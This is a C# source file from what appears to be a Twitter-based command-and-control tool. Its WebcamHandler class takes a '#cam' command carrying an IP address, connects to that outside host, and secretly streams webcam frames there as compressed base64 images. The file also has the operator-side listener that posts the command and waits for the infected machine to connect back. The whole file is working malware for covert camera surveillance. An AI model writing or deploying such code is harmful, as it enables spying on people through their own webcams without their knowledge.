using AForge.Video.DirectShow;
using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace TwitterCommandAndControl
{
    public static class WebcamHandler
    {
        private const int PORT = 8888;
        public static void Respond(string command)
        {
            command = command.ToLower();
            if (command.Contains("#cam"))
            {
                var ip = command.Split('#').Where(x => x.StartsWith("ip=")).Select(x => x.Split('=')[1]).FirstOrDefault();
                VideoCaptureDevice cam = null;
                try
                {
                    using (var tcpClient = new TcpClient())
                    {
                        tcpClient.Connect(ip, PORT);
                        using (var networkStream = tcpClient.GetStream())
                        using (var gzipStream = new GZipStream(networkStream, CompressionMode.Compress))
                        using (var writer = new StreamWriter(gzipStream))
                        {
                            networkStream.WriteTimeout = 500;
                            var failed = false;
                            cam = new VideoCaptureDevice(new FilterInfoCollection(FilterCategory.VideoInputDevice)[0].MonikerString);
                            cam.VideoResolution = cam.VideoCapabilities.OrderBy(x => x.FrameSize.Width).FirstOrDefault();
                            cam.NewFrame += (x, y) =>
                            {
                                try
                                {
                                    if (tcpClient.Connected)
                                    {
                                        using (var memoryStream = new MemoryStream())
                                        {
                                            if (y.Frame.Width > 800)
                                            {
                                                int width = 800;
                                                int height = (int)Math.Ceiling((y.Frame.Height / (1.0 * y.Frame.Width)) * width);
                                                y.Frame.GetThumbnailImage(width, height, null, IntPtr.Zero).Save(memoryStream, System.Drawing.Imaging.ImageFormat.Png);
                                            }
                                            else
                                            {
                                                y.Frame.Save(memoryStream, System.Drawing.Imaging.ImageFormat.Png);
                                            }
                                            writer.WriteLine(System.Convert.ToBase64String(memoryStream.ToArray()));
                                            writer.Flush();
                                        }
                                    }
                                }
                                catch { failed = true; }
                            };
                            cam.Start();
                            while (tcpClient.Connected && !failed) Thread.Sleep(100);
                            cam.Stop();
                        }
                    }
                }
                catch { }
                finally {
                    if (cam != null) 
                        cam.Stop();
                }
            }
        }

        public static TcpClient Request(string commandPrefix)
        {
            TcpClient client = null;
            var listenerTask = Task.Factory.StartNew(() =>
            {
                TcpListener listener = new TcpListener(IPAddress.Any, PORT);
                listener.Start();
                client = listener.AcceptTcpClient();
                listener.Stop();
            });
            Messenger.Send(commandPrefix + " #cam #ip=" + GetPublicIP.GetIP());
            listenerTask.Wait();
            return client;
        }
    }
}
